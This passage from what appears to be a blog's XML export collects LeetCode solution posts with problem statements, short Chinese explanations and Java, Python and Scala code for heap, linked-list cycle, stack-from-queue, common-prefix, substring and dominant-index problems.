<blockquote>
<ul>
<li><p>Example:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int k = 3;</span><br><span class="line">int[] arr = [4,5,8,2];</span><br><span class="line">KthLargest kthLargest = new KthLargest(3, arr);</span><br><span class="line">kthLargest.add(3);   // returns 4</span><br><span class="line">kthLargest.add(5);   // returns 5</span><br><span class="line">kthLargest.add(10);  // returns 5</span><br><span class="line">kthLargest.add(9);   // returns 8</span><br><span class="line">kthLargest.add(4);   // returns 8</span><br></pre></td></tr></table></figure>
</li>
<li><p>Note: </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">You may assume that nums&apos; length ≥ k-1 and k ≥ 1.</span><br></pre></td></tr></table></figure>
</li>
</ul>
</blockquote>
<a id="more"></a>
<h1 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h1><p>求数组中的第K个最大值</p>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><blockquote>
<ul>
<li>java</li>
</ul>
</blockquote>
<p>优先级队列</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">KthLargest</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> PriorityQueue&lt;Integer&gt; q;</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">int</span> k;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">KthLargest</span><span class="params">(<span class="keyword">int</span> k, <span class="keyword">int</span>[] a)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.k = k;</span><br><span class="line">      q = <span class="keyword">new</span> PriorityQueue&lt;&gt;(k);</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> n : a)</span><br><span class="line">        add(n);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (q.size() &lt; k)</span><br><span class="line">        q.offer(n);</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (q.peek() &lt; n) &#123;</span><br><span class="line">        q.poll();</span><br><span class="line">        q.offer(n);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> q.peek();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://leetcode.com/problems/kth-largest-element-in-a-stream/discuss/?currentPage=1&amp;orderBy=most_votes&amp;query=" target="_blank" rel="noopener">kth-largest-element-in-a-stream</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>heapsort</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>141. Linked List Cycle</title>
    <url>/2019/03/23/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/leetcode/Linked%20List%20Cycle/</url>
    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Given a linked list, determine if it has a cycle in it.</span><br><span class="line">To represent a cycle in the given linked list, we use an integer pos which represents the position (0-indexed) in the linked list where tail connects to. If pos is -1, then there is no cycle in the linked list.</span><br><span class="line"></span><br><span class="line">Example 1:</span><br><span class="line"></span><br><span class="line">Input: head = [3,2,0,-4], pos = 1</span><br><span class="line">Output: true</span><br><span class="line">Explanation: There is a cycle in the linked list, where tail connects to the second node.</span><br></pre></td></tr></table></figure>
<p><img src="https://assets.leetcode.com/uploads/2018/12/07/circularlinkedlist.png" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Example 2:</span><br><span class="line">Input: head = [1,2], pos = 0</span><br><span class="line">Output: true</span><br><span class="line">Explanation: There is a cycle in the linked list, where tail connects to the first node.</span><br></pre></td></tr></table></figure>
<p><img src="https://assets.leetcode.com/uploads/2018/12/07/circularlinkedlist_test2.png" alt><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Example 3:</span><br><span class="line">Input: head = [1], pos = -1</span><br><span class="line">Output: false</span><br><span class="line">Explanation: There is no cycle in the linked list.</span><br></pre></td></tr></table></figure></p>
<p><img src="https://assets.leetcode.com/uploads/2018/12/07/circularlinkedlist_test3.png" alt></p>
<p>Follow up:</p>
<p>Can you solve it using O(1) (i.e. constant) memory?<br><a id="more"></a></p>
<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>题目比较简单,容易理解。判断一个线性链表是否有环,可能的话用O(1)的空间复杂度来解决。有两种方法：</p>
<blockquote>
<ul>
<li>第一种需要额外的空间,用Set来存放遍历过的链表,每次判断是否包含在Set中,如果包含即是有环链表。时间和空间复杂度都为O(n)</li>
<li>第二种方法空间复杂度为O(1),用两个快慢指针,一个为当前节点的下一个节点,另一个指针为下一个节点的下一个节点。如果这两个节点相同表示有环，否则为无环。</li>
</ul>
</blockquote>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><blockquote>
<ul>
<li>第一种方法的实现python</li>
</ul>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListNode</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        self.val = x</span><br><span class="line">        self.next = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LinkedListCycle</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">hasCycle</span><span class="params">(self, head)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type head: ListNode</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> head <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        res = set()</span><br><span class="line">        <span class="keyword">while</span> head <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">if</span> head <span class="keyword">in</span> res:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                res.add(head)</span><br><span class="line">            head = head.next</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>第二种方法</li>
</ul>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LinkedListCycle</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">hasCycle</span><span class="params">(self, head)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type head: ListNode</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> head <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> head.next <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        slow = head</span><br><span class="line">        fast = head.next</span><br><span class="line">        <span class="keyword">while</span> slow != fast:</span><br><span class="line">            <span class="keyword">if</span> fast <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> fast.next <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            slow = slow.next</span><br><span class="line">            fast = fast.next.next   </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://leetcode.com/problems/linked-list-cycle/solution/" target="_blank" rel="noopener">141. Linked List Cycle</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>225. Implement Stack using Queues</title>
    <url>/2019/05/15/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/leetcode/Implement%20Stack%20using%20Queues/</url>
    <content><![CDATA[<p>Implement the following operations of a stack using queues.</p>
<blockquote>
<ul>
<li>push(x) — Push element x onto stack.</li>
<li>pop() — Removes the element on top of the stack.</li>
<li>top() — Get the top element.</li>
<li>empty() — Return whether the stack is empty.</li>
</ul>
</blockquote>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MyStack stack = new MyStack();</span><br><span class="line"></span><br><span class="line">stack.push(1);</span><br><span class="line">stack.push(2);</span><br><span class="line">stack.top(); // returns 2</span><br><span class="line">stack.pop(); // returns 2</span><br><span class="line">stack.empty(); // returns false</span><br></pre></td></tr></table></figure>
<p>Notes:</p>
<blockquote>
<ul>
<li>You must use only standard operations of a queue — which means only push to back, peek/pop from front, size, and is empty operations are valid.</li>
<li>Depending on your language, queue may not be supported natively. You may simulate a queue by using a list or deque (double-ended queue), as long as you use only standard operations of a queue.</li>
<li>You may assume that all operations are valid (for example, no pop or top operations will be called on an empty stack).</li>
</ul>
</blockquote>
<a id="more"></a>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><blockquote>
<ul>
<li>java</li>
</ul>
</blockquote>
<p>双端队列.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyStack</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    ArrayDeque&lt;Integer&gt; queue;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Initialize your data structure here. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyStack</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       queue = <span class="keyword">new</span> ArrayDeque&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Push element x onto stack. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        queue.add(x);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Removes the element on top of the stack and returns that element. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> queue.removeLast();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Get the top element. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">top</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> queue.getLast();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Returns whether the stack is empty. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">empty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> queue.isEmpty();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>java</li>
</ul>
</blockquote>
<p>单向队列.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyStack</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    Queue&lt;Integer&gt; queue;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyStack</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.queue=<span class="keyword">new</span> LinkedList&lt;Integer&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Push element x onto stack.</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">       queue.add(x);</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;queue.size()-<span class="number">1</span>;i++)</span><br><span class="line">       &#123;</span><br><span class="line">           queue.add(queue.poll());</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Removes the element on top of the stack.</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">pop</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> queue.poll();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get the top element.</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">top</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> queue.peek();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Return whether the stack is empty.</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">empty</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> queue.isEmpty();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><blockquote>
<ul>
<li><a href="https://leetcode.com/problems/implement-stack-using-queues/discuss/?currentPage=1&amp;orderBy=newest_to_oldest&amp;query=" target="_blank" rel="noopener">implement-stack-using-queues</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>stack</tag>
      </tags>
  </entry>
  <entry>
    <title>14.Longest Common Prefix</title>
    <url>/2018/08/06/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/leetcode/Longest%20Common%20Prefix/</url>
    <content><![CDATA[<p>Write a function to find the longest common prefix string amongst an array of strings.<br>If there is no common prefix, return an empty string “”.<br>Example 1:<br>Input: [“flower”,”flow”,”flight”]<br>Output: “fl”<br>Example 2:<br>Input: [“dog”,”racecar”,”car”]<br>Output: “”<br>Explanation: There is no common prefix among the input strings.<br>Note:<br>All given inputs are in lowercase letters a-z.</p>
<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>此题意思是取给定数组中元素的最大长度公共前缀,找不到返回空字符串。题目很简单,但是中间有很多小问题不注意会出错,比如空数组,所有元素都相同。我的解题思路是遍历数组,依次取最长元素的前缀判断是否是最大公共前缀。</p>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><blockquote>
<ul>
<li>scala</li>
</ul>
</blockquote>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">longestCommonPrefix</span></span>(strs: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">String</span> = &#123;</span><br><span class="line">    <span class="comment">// 是否空,</span></span><br><span class="line">     <span class="keyword">if</span> (strs==<span class="literal">null</span> || strs.length&lt;<span class="number">1</span>  || strs.exists(p=&gt;p.trim.length==<span class="number">0</span>))&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="string">""</span></span><br><span class="line">     &#125;</span><br><span class="line">     <span class="comment">//只有一个元素，直接返回</span></span><br><span class="line">    <span class="keyword">if</span> (strs.length==<span class="number">1</span>)&#123;</span><br><span class="line">      <span class="keyword">return</span> strs(<span class="number">0</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//是否所有元素都相同</span></span><br><span class="line">     <span class="keyword">if</span> (strs.toSet.size==<span class="number">1</span>)&#123;</span><br><span class="line">       <span class="keyword">return</span> strs(<span class="number">0</span>)</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="comment">//第一次取第一个元素的第一个字母</span></span><br><span class="line">     <span class="keyword">var</span> prefix = strs(<span class="number">0</span>).charAt(<span class="number">0</span>).toString</span><br><span class="line">     <span class="keyword">var</span> r = <span class="string">""</span></span><br><span class="line">     <span class="keyword">var</span> flag = <span class="literal">true</span></span><br><span class="line">     <span class="keyword">var</span> j = <span class="number">0</span></span><br><span class="line">     <span class="keyword">while</span> (flag)&#123;</span><br><span class="line">         <span class="keyword">val</span> len = strs.length</span><br><span class="line">         <span class="keyword">var</span> rp = strs(<span class="number">0</span>)</span><br><span class="line">         <span class="keyword">for</span> ( i&lt;<span class="number">-0</span> until len)&#123;</span><br><span class="line">           <span class="keyword">if</span> (flag)&#123;</span><br><span class="line">             flag = strs(i).startsWith(prefix)</span><br><span class="line">             <span class="comment">//把最大长度元素作为下次循环的前缀处理元素</span></span><br><span class="line">             <span class="keyword">if</span> (strs(i).length&gt;rp.length)&#123;</span><br><span class="line">               rp = strs(i)</span><br><span class="line">             &#125;</span><br><span class="line">           &#125;</span><br><span class="line">         &#125;</span><br><span class="line">        <span class="keyword">if</span> (flag)&#123;</span><br><span class="line">          j = j+<span class="number">1</span></span><br><span class="line">          <span class="comment">//最大长度元素截取</span></span><br><span class="line">          prefix = rp.substring(<span class="number">0</span>,j)</span><br><span class="line">        &#125;</span><br><span class="line">       r = prefix</span><br><span class="line">     &#125;</span><br><span class="line">     r.substring(<span class="number">0</span>,r.length<span class="number">-1</span>)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>评论区其他答案</p>
<blockquote>
<ul>
<li>python</li>
</ul>
</blockquote>
<p>这个方法很精妙</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">longestCommonPrefix</span><span class="params">(self, strs)</span> -&gt; str:</span></span><br><span class="line"></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    查找公共最大子串</span></span><br><span class="line"><span class="string">    :param strs: List[str]</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> strs:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span></span><br><span class="line">    shortest = min(strs, key=len)</span><br><span class="line">    <span class="keyword">for</span> i, ch <span class="keyword">in</span> enumerate(shortest):</span><br><span class="line">        <span class="keyword">for</span> other <span class="keyword">in</span> strs:</span><br><span class="line">            <span class="keyword">if</span> other[i] != ch:</span><br><span class="line">                <span class="keyword">return</span> shortest[:i]</span><br><span class="line">    <span class="keyword">return</span> shortest</span><br></pre></td></tr></table></figure>
<blockquote>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://leetcode.com/problems/longest-common-prefix/description/" target="_blank" rel="noopener">Longest Common Prefix</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>3. Longest Substring Without Repeating Characters</title>
    <url>/2019/05/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/leetcode/Longest%20Substring%20Without%20Repeating%20Characters/</url>
    <content><![CDATA[<p>Given a string, find the length of the longest substring without repeating characters.</p>
<blockquote>
<ul>
<li>Example 1:</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: &quot;abcabcbb&quot;</span><br><span class="line">Output: 3 </span><br><span class="line">Explanation: The answer is &quot;abc&quot;, with the length of 3.</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>Example 2:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: &quot;bbbbb&quot;</span><br><span class="line">Output: 1</span><br><span class="line">Explanation: The answer is &quot;b&quot;, with the length of 1.</span><br></pre></td></tr></table></figure>
<ul>
<li>Example 3:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: &quot;pwwkew&quot;</span><br><span class="line">Output: 3</span><br><span class="line">Explanation: The answer is &quot;wke&quot;, with the length of 3. </span><br><span class="line">             Note that the answer must be a substring, &quot;pwke&quot; is a subsequence and not a substring.</span><br></pre></td></tr></table></figure>
</blockquote>
<a id="more"></a>
<h1 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h1><p>求出字符串中不包含重复字符的最大连续字符串的长度。</p>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><blockquote>
<ul>
<li>java</li>
</ul>
</blockquote>
<p>暴力遍历求解</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (s == <span class="keyword">null</span> || s.length() == <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> max = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> temp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> len = s.length();</span><br><span class="line">    <span class="keyword">char</span>[] ary = s.toCharArray();</span><br><span class="line">    Set&lt;Character&gt; res = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">      <span class="keyword">char</span> out  = ary[i];</span><br><span class="line">      <span class="keyword">if</span> (!res.contains(out))&#123;</span><br><span class="line">        temp++;</span><br><span class="line">        res.add(out);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = i+<span class="number">1</span>; j &lt; len;j++)&#123;</span><br><span class="line">          <span class="keyword">char</span> in  = ary[j];</span><br><span class="line">          <span class="keyword">if</span> (!res.contains(in))&#123;</span><br><span class="line">            temp ++;</span><br><span class="line">            res.add(in);</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (temp &gt; max)&#123;</span><br><span class="line">          max = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        temp = <span class="number">0</span>;</span><br><span class="line">        res.clear();</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> max;</span><br></pre></td></tr></table></figure>
<p>讨论区其他答案</p>
<blockquote>
<ul>
<li>java</li>
</ul>
</blockquote>
<p>HashMap求解</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (s.length()==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        HashMap&lt;Character, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;Character, Integer&gt;();</span><br><span class="line">        <span class="keyword">int</span> max=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>, j=<span class="number">0</span>; i&lt;s.length(); ++i)&#123;</span><br><span class="line">            <span class="keyword">if</span> (map.containsKey(s.charAt(i)))&#123;</span><br><span class="line">                j = Math.max(j,map.get(s.charAt(i))+<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            map.put(s.charAt(i),i);</span><br><span class="line">            max = Math.max(max,i-j+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>java</li>
</ul>
</blockquote>
<p>双指针</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span>[] v=s.toCharArray();</span><br><span class="line">        <span class="keyword">int</span> length=-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> max=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;v.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i==<span class="number">0</span>)&#123;</span><br><span class="line">                length=<span class="number">1</span>;</span><br><span class="line">                max=<span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">int</span> ind=-<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j=i-<span class="number">1</span>;j&gt;=i-length;j--)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(v[i]==v[j])&#123;</span><br><span class="line">                        ind=j-(i-length);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(ind==-<span class="number">1</span>)&#123;</span><br><span class="line">                    length=length+<span class="number">1</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    length=length-ind;</span><br><span class="line">                &#125;</span><br><span class="line">                max=max&gt;length?max:length;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> max;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://leetcode.com/problems/longest-substring-without-repeating-characters/discuss/?currentPage=1&amp;orderBy=most_votes&amp;query=" target="_blank" rel="noopener">longest-substring-without-repeating-characters</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>two pointers</tag>
      </tags>
  </entry>
  <entry>
    <title>747.Largest Number At Least Twice of Others</title>
    <url>/2019/04/28/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/leetcode/Largest%20Number%20At%20Least%20Twice%20of%20Others/</url>
    <content><![CDATA[<p>In a given integer array nums, there is always exactly one largest element.<br>Find whether the largest element in the array is at least twice as much as every other number in the array.<br>If it is, return the index of the largest element, otherwise return -1.<br>Example 1:<br>Input: nums = [3, 6, 1, 0]<br>Output: 1<br>Explanation: 6 is the largest integer, and for every other number in the array x,<br>6 is more than twice as big as x. The index of value 6 is 1, so we return 1.<br>Example 2:<br>Input: nums = [1, 2, 3, 4]<br>Output: -1<br>Explanation: 4 isn’t at least as big as twice the value of 3, so we return -1.</p>
<p>Note:</p>
<blockquote>
<ul>
<li>nums will have a length in the range [1, 50].</li>
<li>Every nums[i] will be an integer in the range [0, 99].</li>
</ul>
</blockquote>
<h1 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h1><p>找到给定数组的最大元素,该元素是其他元素至少大两倍.如果存在该最大元素返回其索引位置,不存在返回-1.</p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>找到最大元素,遍历比较元素大小即可。</p>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><blockquote>
<ul>
<li>scala</li>
</ul>
</blockquote>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dominantIndex</span></span>(nums: <span class="type">Array</span>[<span class="type">Int</span>]): <span class="type">Int</span> = &#123;</span><br><span class="line">    <span class="keyword">val</span> target = nums.sorted.last</span><br><span class="line">    <span class="keyword">val</span> size = nums.length</span><br><span class="line">    <span class="keyword">for</span> ( i &lt;- <span class="number">0</span> until size)&#123;</span><br><span class="line">      <span class="keyword">if</span> (nums(i) != <span class="number">0</span> &amp;&amp; target != nums(i) &amp;&amp;  target/nums(i) &lt; <span class="number">2</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    nums.indexOf(target)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>讨论区其他答案</p>
<blockquote>
<ul>
<li>java</li>
</ul>
</blockquote>
